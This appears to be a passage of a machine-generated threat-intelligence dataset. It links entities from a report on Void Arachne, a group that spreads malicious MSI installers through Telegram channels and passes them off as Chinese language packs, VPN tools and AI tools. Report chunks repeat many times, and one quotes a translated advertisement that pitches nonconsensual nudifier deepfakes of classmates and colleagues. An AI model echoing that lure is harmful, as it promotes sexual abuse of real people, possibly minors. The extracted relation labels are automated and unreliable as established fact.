              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--telegram-spearphishing",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--telegram-spearphishing",
      "target": "technique--spearphishing",
      "confidence": 0.9,
      "evidence": "攻击活动使用鱼叉式网络钓鱼技术",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--telegram-distribution",
      "target": "tool--malicious-archives",
      "confidence": 0.9,
      "evidence": "分发程序使用恶意存档文件",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--telegram-distribution",
      "target": "tool--msi-files",
      "confidence": 0.9,
      "evidence": "分发程序使用恶意MSI文件",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "attack-event--telegram-spearphishing",
      "confidence": 0.95,
      "evidence": "报告记录了Telegram鱼叉式网络钓鱼活动",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "threat-org--void-arachne",
      "target": "attack-event--telegram-spearphishing",
      "confidence": 0.95,
      "evidence": "Void Arachne组织发起了Telegram鱼叉式网络钓鱼活动",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--telegram-spearphishing",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--telegram-spearphishing",
      "target": "technique--spearphishing",
      "confidence": 0.9,
      "evidence": "攻击活动使用鱼叉式网络钓鱼技术",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "HAS",
      "source": "tactic--initial-access",
      "target": "technique--spearphishing",
      "confidence": 0.95,
      "evidence": "初始访问战术包含鱼叉式网络钓鱼技术",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "attack-event--telegram-spearphishing",
      "target": "tool--msi-file",
      "confidence": 0.95,
      "evidence": "攻击活动使用恶意MSI文件",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--spearphishing",
      "confidence": 0.95,
      "evidence": "报告记录了通过Telegram进行鱼叉式网络钓鱼的技术",
      "chunks_info": [
        {
          "chunk_id": 7,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Malicious Simplified Chinese language packs for Telegram  \nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be found [here](https://translations.telegram.org/zh-hans/).)  \nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.",
          "chunk_length": 779,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Malicious Simplified Chinese language packs for Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Malicious Simplified Chinese language packs for Telegram"
            ],
            "content_type": "text",
            "token_length": 128,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 7,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "technique--spearphishing",
      "target": "tool--malicious-language-pack",
      "confidence": 0.9,
      "evidence": "鱼叉式网络钓鱼技术使用恶意语言包作为感染媒介",
      "chunks_info": [
        {
          "chunk_id": 7,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Malicious Simplified Chinese language packs for Telegram  \nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be found [here](https://translations.telegram.org/zh-hans/).)  \nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.",
          "chunk_length": 779,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Malicious Simplified Chinese language packs for Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Malicious Simplified Chinese language packs for Telegram"
            ],
            "content_type": "text",
            "token_length": 128,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 7,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "technique--spearphishing",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "鱼叉式网络钓鱼技术针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 7,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Malicious Simplified Chinese language packs for Telegram  \nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be found [here](https://translations.telegram.org/zh-hans/).)  \nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.",
          "chunk_length": 779,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Malicious Simplified Chinese language packs for Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Malicious Simplified Chinese language packs for Telegram"
            ],
            "content_type": "text",
            "token_length": 128,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 7,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "attack-event--telegram-spearphishing",
      "confidence": 0.95,
      "evidence": "报告记录了通过Telegram进行的鱼叉式网络钓鱼攻击活动",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "threat-org--void-arachne",
      "target": "attack-event--telegram-spearphishing",
      "confidence": 0.95,
      "evidence": "Void Arachne组织发起了通过Telegram进行的鱼叉式网络钓鱼攻击活动",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--telegram-spearphishing",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户，包括学生和年轻人",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--telegram-spearphishing",
      "target": "technique--spearphishing-link",
      "confidence": 0.9,
      "evidence": "攻击活动使用鱼叉式网络钓鱼链接技术",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--telegram-malware-distribution",
      "target": "tool--malicious-msi",
      "confidence": 0.95,
      "evidence": "通过Telegram分发恶意软件的程序使用恶意MSI文件",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual 